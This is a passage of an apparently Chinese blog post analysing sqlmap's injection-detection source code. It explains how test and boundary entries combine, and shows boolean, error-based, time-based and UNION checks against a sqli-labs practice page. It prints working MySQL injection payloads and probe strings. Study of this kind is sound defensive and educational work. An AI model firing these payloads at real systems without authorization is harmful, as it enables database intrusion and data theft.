class="keyword">not</span> any((conf.string, conf.notString)):</span><br><span class="line">                                            candidates = filter(<span class="literal">None</span>, (_.strip() <span class="keyword">if</span> _.strip() <span class="keyword">in</span> falseRawResponse <span class="keyword">and</span> _.strip() <span class="keyword">not</span> <span class="keyword">in</span> trueRawResponse <span class="keyword">else</span> <span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> (falseSet - trueSet)))</span><br><span class="line"></span><br><span class="line">                                            <span class="keyword">if</span> candidates:</span><br><span class="line">                                                candidates = sorted(candidates, key=<span class="keyword">lambda</span> _: len(_))</span><br><span class="line">                                                <span class="keyword">for</span> candidate <span class="keyword">in</span> candidates:</span><br><span class="line">                                                    <span class="keyword">if</span> re.match(<span class="string">r"\A\w+\Z"</span>, candidate):</span><br><span class="line">                                                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                                                conf.notString = candidate</span><br><span class="line"></span><br><span class="line">                                                infoMsg = <span class="string">"%s parameter '%s' appears to be '%s' injectable (with --not-string=\"%s\")"</span> % (paramType, parameter, title, repr(conf.notString).lstrip(<span class="string">'u'</span>).strip(<span class="string">"'"</span>))</span><br><span class="line">                                                logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> <span class="keyword">not</span> any((conf.string, conf.notString, conf.code)):</span><br><span class="line">                                    infoMsg = <span class="string">"%s parameter '%s' appears to be '%s' injectable "</span> % (paramType, parameter, title)</span><br><span class="line">                                    singleTimeLogMessage(infoMsg)</span><br><span class="line"></span><br><span class="line">                        <span class="comment"># 报错注入</span></span><br><span class="line">                        <span class="keyword">elif</span> method == PAYLOAD.METHOD.GREP:</span><br><span class="line">                        <span class="comment"># &#123;</span></span><br><span class="line">                        <span class="comment">#     'risk': 1,</span></span><br><span class="line">                        <span class="comment">#     'title': 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)',</span></span><br><span class="line">                        <span class="comment">#     'clause': [1, 2, 3, 8, 9],</span></span><br><span class="line">                        <span class="comment">#     'level': 4,</span></span><br><span class="line">                        <span class="comment">#     'request': &#123; </span></span><br><span class="line">                        <span class="comment">#         'payload': "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"</span></span><br><span class="line">                        <span class="comment">#     &#125;,</span></span><br><span class="line">                        <span class="comment">#     'vector': "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))",</span></span><br><span class="line">                        <span class="comment">#     'details': &#123;</span></span><br><span class="line">                        <span class="comment">#         'dbms': 'MySQL',</span></span><br><span class="line">                        <span class="comment">#         'dbms_version': '&gt;= 5.5'</span></span><br><span class="line">                        <span class="comment">#     &#125;,</span></span><br><span class="line">                        <span class="comment">#     'where': [1],</span></span><br><span class="line">                        <span class="comment">#     'response': &#123;</span></span><br><span class="line">                        <span class="comment">#         'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]'</span></span><br><span class="line">                        <span class="comment">#     &#125;,</span></span><br><span class="line">                        <span class="comment">#     'stype': 2</span></span><br><span class="line">                        <span class="comment"># &#125;</span></span><br><span class="line">                        <span class="comment"># 对于 响应匹配 q(zqxjkvbp)q 中间随机三位</span></span><br><span class="line">                        <span class="comment"># 正则匹配 response 的 grep</span></span><br><span class="line">                            <span class="keyword">try</span>:</span><br><span class="line">                                page, headers, _ = Request.queryPage(reqPayload, place, content=<span class="literal">True</span>, raise404=<span class="literal">False</span>)</span><br><span class="line">                                output = extractRegexResult(check, page, re.DOTALL | re.IGNORECASE)</span><br><span class="line">                                output = output <span class="keyword">or</span> extractRegexResult(check, threadData.lastHTTPError[<span class="number">2</span>] <span class="keyword">if</span> wasLastResponseHTTPError() <span class="keyword">else</span> <span class="literal">None</span>, re.DOTALL | re.IGNORECASE)</span><br><span class="line">                                output = output <span class="keyword">or</span> extractRegexResult(check, listToStrValue((headers[key] <span class="keyword">for</span> key <span class="keyword">in</span> headers.keys() <span class="keyword">if</span> key.lower() != URI_HTTP_HEADER.lower()) <span class="keyword">if</span> headers <span class="keyword">else</span> <span class="literal">None</span>), re.DOTALL | re.IGNORECASE)</span><br><span class="line">                                output = output <span class="keyword">or</span> extractRegexResult(check, threadData.lastRedirectMsg[<span class="number">1</span>] <span class="keyword">if</span> threadData.lastRedirectMsg <span class="keyword">and</span> threadData.lastRedirectMsg[<span class="number">0</span>] == threadData.lastRequestUID <span class="keyword">else</span> <span class="literal">None</span>, re.DOTALL | re.IGNORECASE)</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> output:</span><br><span class="line">                                    result = output == <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">if</span> result:</span><br><span class="line">                                        infoMsg = <span class="string">"%s parameter '%s' is '%s' injectable "</span> % (paramType, parameter, title)</span><br><span class="line">                                        logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">                                        injectable = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">except</span> SqlmapConnectionException, msg:</span><br><span class="line">                                debugMsg = <span class="string">"problem occurred most likely because the "</span></span><br><span class="line">                                debugMsg += <span class="string">"server hasn't recovered as expected from the "</span></span><br><span class="line">                                debugMsg += <span class="string">"error-based payload used ('%s')"</span> % msg</span><br><span class="line">                                logger.debug(debugMsg)</span><br><span class="line"></span><br><span class="line">                        <span class="comment"># 时间盲注</span></span><br><span class="line">                        <span class="keyword">elif</span> method == PAYLOAD.METHOD.TIME:</span><br><span class="line">                            <span class="comment"># Perform the test's request</span></span><br><span class="line">                            trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=<span class="literal">True</span>, raise404=<span class="literal">False</span>)</span><br><span class="line">                            trueCode = threadData.lastCode</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> trueResult:</span><br><span class="line">                                <span class="comment"># Extra validation step (e.g. to check for DROP protection mechanisms)</span></span><br><span class="line">                                <span class="keyword">if</span> SLEEP_TIME_MARKER <span class="keyword">in</span> reqPayload:</span><br><span class="line">                                    falseResult = Request.queryPage(reqPayload.replace(SLEEP_TIME_MARKER, <span class="string">"0"</span>), place, timeBasedCompare=<span class="literal">True</span>, raise404=<span class="literal">False</span>)</span><br><span class="line">                                    <span class="keyword">if</span> falseResult:</span><br><span class="line">                                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                                <span class="comment"># Confirm test's results</span></span><br><span class="line">                                trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=<span class="literal">True</span>, raise404=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> trueResult:</span><br><span class="line">                                    infoMsg = <span class="string">"%s parameter '%s' appears to be '%s' injectable "</span> % (paramType, parameter, title)</span><br><span class="line">                                    logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">                                    injectable = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment"># 联合查询</span></span><br><span class="line">                        <span class="keyword">elif</span> method == PAYLOAD.METHOD.UNION:</span><br><span class="line">                            <span class="comment"># Test for UNION injection and set the sample</span></span><br><span class="line">                            <span class="comment"># payload as well as the vector.</span></span><br><span class="line">                            <span class="comment"># <span class="doctag">NOTE:</span> vector is set to a tuple with 6 elements,</span></span><br><span class="line">                            <span class="comment"># used afterwards by Agent.forgeUnionQuery()</span></span><br><span class="line">                            <span class="comment"># method to forge the UNION query payload</span></span><br><span class="line"></span><br><span class="line">                            configUnion(test.request.char, test.request.columns)</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> len(kb.dbmsFilter <span class="keyword">or</span> []) == <span class="number">1</span>:</span><br><span class="line">                                Backend.forceDbms(kb.dbmsFilter[<span class="number">0</span>])</span><br><span class="line">                            <span class="keyword">elif</span> <span class="keyword">not</span> Backend.getIdentifiedDbms():</span><br><span class="line">                                <span class="keyword">if</span> kb.heuristicDbms <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                                    <span class="keyword">if</span> kb.heuristicTest == HEURISTIC_TEST.POSITIVE <span class="keyword">or</span> injection.data:</span><br><span class="line">                                        warnMsg = <span class="string">"using unescaped version of the test "</span></span><br><span class="line">                                        warnMsg += <span class="string">"because of zero knowledge of the "</span></span><br><span class="line">                                        warnMsg += <span class="string">"back-end DBMS. You can try to "</span></span><br><span class="line">                                        warnMsg += <span class="string">"explicitly set it with option '--dbms'"</span></span><br><span class="line">                                        singleTimeWarnMessage(warnMsg)</span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    Backend.forceDbms(kb.heuristicDbms)</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> unionExtended:</span><br><span class="line">                                infoMsg = <span class="string">"automatically extending ranges for UNION "</span></span><br><span class="line">                                infoMsg += <span class="string">"query injection technique tests as "</span></span><br><span class="line">                                infoMsg += <span class="string">"there is at least one other (potential) "</span></span><br><span class="line">                                infoMsg += <span class="string">"technique found"</span></span><br><span class="line">                                singleTimeLogMessage(infoMsg)</span><br><span class="line"></span><br><span class="line">                            <span class="comment"># Test for UNION query SQL injection</span></span><br><span class="line">                            reqPayload, vector = unionTest(comment, place, parameter, value, prefix, suffix)</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> isinstance(reqPayload, basestring):</span><br><span class="line">                                infoMsg = <span class="string">"%s parameter '%s' is '%s' injectable"</span> % (paramType, parameter, title)</span><br><span class="line">                                logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">                                injectable = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                                <span class="comment"># Overwrite 'where' because it can be set</span></span><br><span class="line">                                <span class="comment"># by unionTest() directly</span></span><br><span class="line">                                where = vector[<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">                        kb.previousMethod = method</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> conf.offline:</span><br><span class="line">                            injectable = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment"># If the injection test was successful feed the injection</span></span><br><span class="line">                    <span class="comment"># object with the test's details</span></span><br><span class="line">                    <span class="keyword">if</span> injectable <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        <span class="comment"># Feed with the boundaries details only the first time a</span></span><br><span class="line">                        <span class="comment"># test has been successful</span></span><br><span class="line">                        <span class="keyword">if</span> injection.place <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> injection.parameter <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                            <span class="keyword">if</span> place <span class="keyword">in</span> (PLACE.USER_AGENT, PLACE.REFERER, PLACE.HOST):</span><br><span class="line">                                injection.parameter = place</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                injection.parameter = parameter</span><br><span class="line"></span><br><span class="line">                            injection.place = place</span><br><span class="line">                            injection.ptype = ptype</span><br><span class="line">                            injection.prefix = prefix</span><br><span class="line">                            injection.suffix = suffix</span><br><span class="line">                            injection.clause = clause</span><br><span class="line"></span><br><span class="line">                        <span class="comment"># 注入的语句有的是能确定数据库类型及其版本的 确定的话就存储数据</span></span><br><span class="line">                        <span class="keyword">if</span> hasattr(test, <span class="string">"details"</span>):</span><br><span class="line">                            <span class="keyword">for</span> key, value <span class="keyword">in</span> test.details.items():</span><br><span class="line">                                <span class="keyword">if</span> key == <span class="string">"dbms"</span>:</span><br><span class="line">                                    injection.dbms = value</span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, list):</span><br><span class="line">                                        Backend.setDbms(value)</span><br><span class="line">                                    <span class="keyword">else</span>:</span><br><span class="line">                                        Backend.forceDbms(value[<span class="number">0</span>], <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">elif</span> key == <span class="string">"dbms_version"</span> <span class="keyword">and</span> injection.dbms_version <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> conf.testFilter:</span><br><span class="line">                                    injection.dbms_version = Backend.setVersion(value)</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">elif</span> key == <span class="string">"os"</span> <span class="keyword">and</span> injection.os <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                                    injection.os = Backend.setOs(value)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> vector <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="string">"vector"</span> <span class="keyword">in</span> test <span class="keyword">and</span> test.vector <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                            vector = test.vector</span><br><span class="line">                        <span class="comment"># 成功后将注入的数据都存储到 inject中</span></span><br><span class="line">                        injection.data[stype] = AttribDict()</span><br><span class="line">                        injection.data[stype].title = title</span><br><span class="line">                        injection.data[stype].payload = agent.removePayloadDelimiters(reqPayload)</span><br><span class="line">                        <span class="comment"># payload u'id=1") AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786b6a71,(SELECT (ELT(9718=9718,1))),0x7162627671,0x78))s), 8446744073709551610, 8446744073709551610))) AND ("qNpF"="qNpF'</span></span><br><span class="line">                        injection.data[stype].where = where</span><br><span class="line">                        injection.data[stype].vector = vector</span><br><span class="line">                        <span class="comment"># vector "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"</span></span><br><span class="line">                        injection.data[stype].comment = comment</span><br><span class="line">                        injection.data[stype].templatePayload = templatePayload</span><br><span class="line">                        injection.data[stype].matchRatio = kb.matchRatio</span><br><span class="line">                        injection.data[stype].trueCode = trueCode</span><br><span class="line">                        injection.data[stype].falseCode = falseCode</span><br><span class="line"></span><br><span class="line">                        injection.conf.textOnly = conf.textOnly</span><br><span class="line">                        injection.conf.titles = conf.titles</span><br><span class="line">                        injection.conf.code = conf.code</span><br><span class="line">                        injection.conf.string = conf.string</span><br><span class="line">                        injection.conf.notString = conf.notString</span><br><span class="line">                        injection.conf.regexp = conf.regexp</span><br><span class="line">                        injection.conf.optimize = conf.optimize</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">not</span> kb.alerted:</span><br><span class="line">                            <span class="keyword">if</span> conf.beep:</span><br><span class="line">                                beep()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> conf.alert:</span><br><span class="line">                                infoMsg = <span class="string">"executing alerting shell command(s) ('%s')"</span> % conf.alert</span><br><span class="line">                                logger.info(infoMsg)</span><br><span class="line"></span><br><span class="line">                                process = subprocess.Popen(conf.alert.encode(sys.getfilesystemencoding() <span class="keyword">or</span> UNICODE_ENCODING), shell=<span class="literal">True</span>)</span><br><span class="line">                                process.wait()</span><br><span class="line"></span><br><span class="line">                            kb.alerted = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment"># There is no need to perform this test for other</span></span><br><span class="line">                        <span class="comment"># &lt;where&gt; tags</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> injectable <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                    kb.vulnHosts.add(conf.hostname)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Reset forced back-end DBMS value</span></span><br><span class="line">            Backend.flushForcedDbms()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="comment"># Reset forced back-end DBMS value</span></span><br><span class="line">            Backend.flushForcedDbms()</span><br><span class="line"></span><br><span class="line">    Backend.flushForcedDbms(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Return the injection object</span></span><br><span class="line">    <span class="keyword">if</span> injection.place <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> injection.parameter <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> conf.dropSetCookie <span class="keyword">and</span> PAYLOAD.TECHNIQUE.BOOLEAN <span class="keyword">in</span> injection.data <span class="keyword">and</span> injection.data[PAYLOAD.TECHNIQUE.BOOLEAN].vector.startswith(<span class="string">'OR'</span>):</span><br><span class="line">            warnMsg = <span class="string">"in OR boolean-based injection cases, please consider usage "</span></span><br><span class="line">            warnMsg += <span class="string">"of switch '--drop-set-cookie' if you experience any "</span></span><br><span class="line">            warnMsg += <span class="string">"problems during data retrieval"</span></span><br><span class="line">            logger.warn(warnMsg)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> checkFalsePositives(injection):</span><br><span class="line">            kb.vulnHosts.remove(conf.hostname)</span><br><span class="line">            <span class="keyword">if</span> NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE <span class="keyword">not</span> <span class="keyword">in</span> injection.notes:</span><br><span class="line">                injection.notes.append(NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        injection = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> injection <span class="keyword">and</span> NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE <span class="keyword">not</span> <span class="keyword">in</span> injection.notes:</span><br><span class="line">        checkSuhosinPatch(injection)</span><br><span class="line">        checkFilteredChars(injection)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> injection</span><br></pre></td></tr></table></figure>

<p>我们具体说明下 边界 test 等</p>
<h5 id="test"><a href="#test" class="headerlink" title="test"></a>test</h5><p>参考 <a href="https://wooyun.js.org/drops/SQLMap%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88Part1%EF%BC%89.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/SQLMap%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%EF%BC%88Part1%EF%BC%89.html</a>  </p>
<p><strong>title属性</strong><br>title属性为当前测试Payload的标题，通过标题就可以了解当前的注入手法与测试的数据库类型。</p>
<p><strong>stype属性</strong><br>这一个属性标记着当前的注入手法类型，1为布尔类型盲注，2为报错注入。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1: Boolean-based blind SQL injection</span><br><span class="line">2: Error-based queries SQL injection</span><br><span class="line">3: Inline queries SQL injection</span><br><span class="line">4: Stacked queries SQL injection</span><br><span class="line">5: Time-based blind SQL injection</span><br><span class="line">6: UNION query SQL injection</span><br></pre></td></tr></table></figure>

<p><strong>level属性</strong><br>这个属性是每个test都有的，他是作用是是限定在SQL测试中处于哪个深度，简单的来说就是当你在使用SQLMAP进行SQL注入测试的时候，需要指定扫描的level，默认是1，最大为5，当level约高是，所执行的test越多，如果你是指定了level5进行注入测试，那麽估计执行的测试手法会将超过1000个。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1: Always (&lt;100 requests)</span><br><span class="line">2: Try a bit harder (100-200 requests)</span><br><span class="line">3: Good number of requests (200-500 requests)</span><br><span class="line">4: Extensive test (500-1000 requests)</span><br><span class="line">5: You have plenty of time (&gt;1000 requests)</span><br></pre></td></tr></table></figure>

<p><strong>clause</strong><br>payload在哪个位置生效  </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0: Always</span><br><span class="line">1: WHERE / HAVING</span><br><span class="line">2: GROUP BY</span><br><span class="line">3: ORDER BY</span><br><span class="line">4: LIMIT</span><br><span class="line">5: OFFSET</span><br><span class="line">6: TOP</span><br><span class="line">7: Table name</span><br><span class="line">8: Column name</span><br><span class="line">9: Pre-WHERE (non-query)</span><br></pre></td></tr></table></figure>

<p><strong>where属性</strong><br>添加完整payload<prefix> <payload><comment> <suffix>的地方, 这和boundary子节点where的含义是一致的</suffix></comment></payload></prefix></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1:将字符串附加到 参数原始值</span><br><span class="line">2:将参数原始值替换为负随机整数值，并附加字符串</span><br><span class="line">3:用字符串替换 参数原始值</span><br></pre></td></tr></table></figure>

<p><strong>payload属性</strong><br>这一属性既是将要进行测试的SQL语句，也是SQLMap扫描逻辑的关键,其中的[RANDNUM]，[DELIMITER_START]，[DELIMITER_STOP]分别代表着随机数值与字符。当SQLMap扫描时会把对应的随机数替换掉,然后再与boundary的前缀与后缀拼接起来,最终成为测试的Payload。</p>
<p>comment 是注释  在payload之后 后缀之前的语句  </p>
<p><strong>details属性</strong><br>其子节点会一般有两个，其dbms子节所代表的是当前Payload所适用的数据库类型，当前例子中的值为MySQL，则表示其Payload适用的数据库为MySQL,其dbms_version子节所代表的适用的数据库版本。</p>
<p><strong>response属性</strong><br>这一属性下的子节点标记着当前测试的Payload测试手法<br>    grep        ：报错注入<br>    comparison  ：布尔盲注入<br>    time        ：延时注入<br>    union       ：联合查询注入  </p>
<p>vetor 注入向量 指定将使用的注入模板  </p>
<h5 id="boundary"><a href="#boundary" class="headerlink" title="boundary"></a>boundary</h5><p><strong>ptype</strong><br>测试参数的类型  </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1：非转义数字</span><br><span class="line">2：单引号字符串</span><br><span class="line">3:像单引号字符串</span><br><span class="line">4:双引号字符串</span><br><span class="line">5:像双引号字符串</span><br></pre></td></tr></table></figure>

<p><strong>prefix</strong><br>前缀</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;payload&gt; &lt;comment&gt;添加的前缀</span><br></pre></td></tr></table></figure>

<p><strong>suffix</strong><br>后缀</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;payload&gt; &lt;comment&gt;添加的后缀</span><br></pre></td></tr></table></figure>

<p>循环遍历每一个test,<br>对某个test,循环遍历boundary<br>若boundary的where包含test的where值，并且boundary的clause包含test的clause值, 则boundary和test可以匹配<br>循环test的where值,结合匹配的boundary生成相应的payload  </p>
<p>第一个匹配上的 边界的前后缀:  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prefix: <span class="string">')'</span></span><br><span class="line">suffix: <span class="string">'AND ([RANDNUM]=[RANDNUM]'</span></span><br></pre></td></tr></table></figure>

<p>闭合前面的括号 成对出现的  </p>
<p>如果有参数指定的前后缀则使用参数指定的  </p>
<p>然后对 test的paylaod 对应的增加前后缀  </p>
<p>第一次发正确的<br>u’1) AND 7862=7862 AND (9976=9976’<br>然后进行编码  </p>
<p>然后将请求的页面等数据存储到当前线程 threadData中存储  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">trueResult = Request.queryPage(reqPayload, place, raise404=<span class="literal">False</span>)</span><br><span class="line">truePage, trueHeaders, trueCode = threadData.lastComparisonPage <span class="keyword">or</span> <span class="string">""</span>, threadData.lastComparisonHeaders, threadData.lastComparisonCode</span><br><span class="line">trueRawResponse = <span class="string">"%s%s"</span> % (trueHeaders, truePage)</span><br></pre></td></tr></table></figure>

<p>有闭合前后括号<br>最后面注释  </p>
<p>他会对payload 把数字等去掉来进行去除  </p>
<p>请求的时候会标识符进行替换 然后再发起请求  </p>
<p>1 and 1873=9402<br>1 and 9977=9977  </p>
<p>最后是单引号闭合成功 因为页面不同了 因为是错误的</p>
<h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p><img src="/2019/11/08/sqlmap源码浅析/%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%AA%8C%E8%AF%81payload%E9%AA%8C%E8%AF%81%E6%B5%8B%E8%AF%95.jpg" alt="第一次验证payload验证测试">  </p>
<p>这两次的页面内容都是一样的 </p>
<p>后续替换边界验证  </p>
<p><img src="/2019/11/08/sqlmap源码浅析/%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%AA%8C%E8%AF%81payload%E9%AA%8C%E8%AF%81%E6%B5%8B%E8%AF%95.jpg" alt="第一次验证payload验证测试">  </p>
<p>最后单引号的两次页面不一样  </p>
<p>trueRawResponse  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'Date: Sat, 02 Nov 2019 03:13:49 GMT\r\n'</span>, <span class="string">'Server: Apache/2.4.7 (Ubuntu)\r\n'</span>, <span class="string">'X-Powered-By: PHP/5.5.9-1ubuntu4.13\r\n'</span>, <span class="string">'Vary: Accept-Encoding\r\n'</span>, <span class="string">'Content-Encoding: gzip\r\n'</span>, <span class="string">'Content-Length: 456\r\n'</span>, <span class="string">'Connection: close\r\n'</span>, <span class="string">'Content-Type: text/html\r\n'</span>&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less-1 **Error Based- String**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center"&gt;Welcome\xa0\xa0\xa0&lt;font color="#FF0000"&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;font size='5' color= '#99FF00'&gt;Your Login name:Dumb&lt;br&gt;Your Password:Dumb&lt;/font&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src="../images/Less-1.jpg" /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>falseRawResponse  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'Date: Sat, 02 Nov 2019 03:13:46 GMT\r\n'</span>, <span class="string">'Server: Apache/2.4.7 (Ubuntu)\r\n'</span>, <span class="string">'X-Powered-By: PHP/5.5.9-1ubuntu4.13\r\n'</span>, <span class="string">'Vary: Accept-Encoding\r\n'</span>, <span class="string">'Content-Encoding: gzip\r\n'</span>, <span class="string">'Content-Length: 424\r\n'</span>, <span class="string">'Connection: close\r\n'</span>, <span class="string">'Content-Type: text/html\r\n'</span>&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less-1 **Error Based- String**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center"&gt;Welcome\xa0\xa0\xa0&lt;font color="#FF0000"&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span 